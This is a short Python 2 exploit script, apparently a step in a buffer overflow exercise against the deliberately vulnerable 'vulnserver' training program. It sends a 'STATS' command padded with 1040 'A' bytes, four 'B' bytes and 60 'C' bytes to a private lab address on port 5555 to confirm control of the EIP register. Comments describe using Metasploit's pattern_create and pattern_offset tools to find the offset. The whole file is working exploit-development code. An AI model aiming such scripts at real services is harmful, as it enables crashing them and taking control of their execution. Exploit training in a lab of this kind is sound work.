#!/usr/bin/python
import time, struct, sys
import socket



#req1 = "AUTH " + "\x41"*1072


#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1040 > pattern.txt 
#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP Register # here>
#offset was actually 1040 so we will prove this in the next vulnserverPOC4
#buffer = ""

cmd = "STATS "
#1040 is the offset real value of the pattern that was 1100 bytes long, padd with 4 B's and add the value of 1100 - 1040 together
buffer = "A"*1040 +"B"*4+"C"*60


print "Sending Evil Buffer!"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('10.11.4.94', 5555))
s.recv(1024)
s.send(cmd+buffer)
s.close()